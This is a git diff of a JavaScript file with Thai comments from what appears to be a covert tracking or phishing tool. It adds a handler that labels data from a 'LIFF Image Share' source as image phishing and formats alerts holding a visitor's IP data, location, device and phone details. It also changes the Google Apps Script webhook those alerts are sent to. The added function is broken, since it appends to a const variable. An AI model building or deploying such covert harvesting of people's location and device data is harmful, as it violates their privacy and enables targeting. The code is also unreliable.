@@ -132,7 +132,38 @@ function getUrlParameters() {
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
-  return Date.now().toString(36) + Math.random().toString(36).substr(2);
+  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
+}
+
+// ฟังก์ชันใหม่เพื่อรองรับการแจ้งเตือนจาก LIFF Image Share
+function processImagePhishingData(data) {
+  // ตรวจสอบว่าเป็นข้อมูลจากรูปภาพ
+  if (data.source === 'liff-image') {
+    // เพิ่ม flag บ่งบอกว่ามาจากรูปภาพ
+    data.isImagePhishing = true;
+    
+    // ปรับแต่งข้อความแจ้งเตือน
+    const originalMessage = createDetailedMessage(
+      data.ipData, data.location, data.timestamp, 
+      data.deviceData, data.phoneInfo, data.trackingKey, data.caseName
+    );
+    
+    // เพิ่มข้อมูลเกี่ยวกับที่มาของการฟิชชิ่ง
+    const enhancedMessage = "[แจ้งเตือนฟิชชิ่งจากรูปภาพ]\n" + originalMessage;
+    
+    // ถ้ามี imageUrl ให้เพิ่มลงในข้อความ
+    if (data.imageUrl) {
+      enhancedMessage += "\n\n🖼️รูปภาพที่ใช้: " + data.imageUrl;
+    }
+    
+    return enhancedMessage;
+  }
+  
+  // ถ้าไม่ใช่ ให้ใช้ฟังก์ชันเดิม
+  return createDetailedMessage(
+    data.ipData, data.location, data.timestamp, 
+    data.deviceData, data.phoneInfo, data.trackingKey, data.caseName
+  );
 }
 
 // ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
@@ -863,7 +894,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbyFXbu48GasTyxGlmUr1NOJRrXgFoEYyRgfob67gzV6QzwgxtLoK6x0RZIm11gAMrm6/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxklmBbC60cVZHdHAR8KuNbyDe1uVVa-HssltqYBHIKgWs0cURojb7yEQP6M-oqiX9Z/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
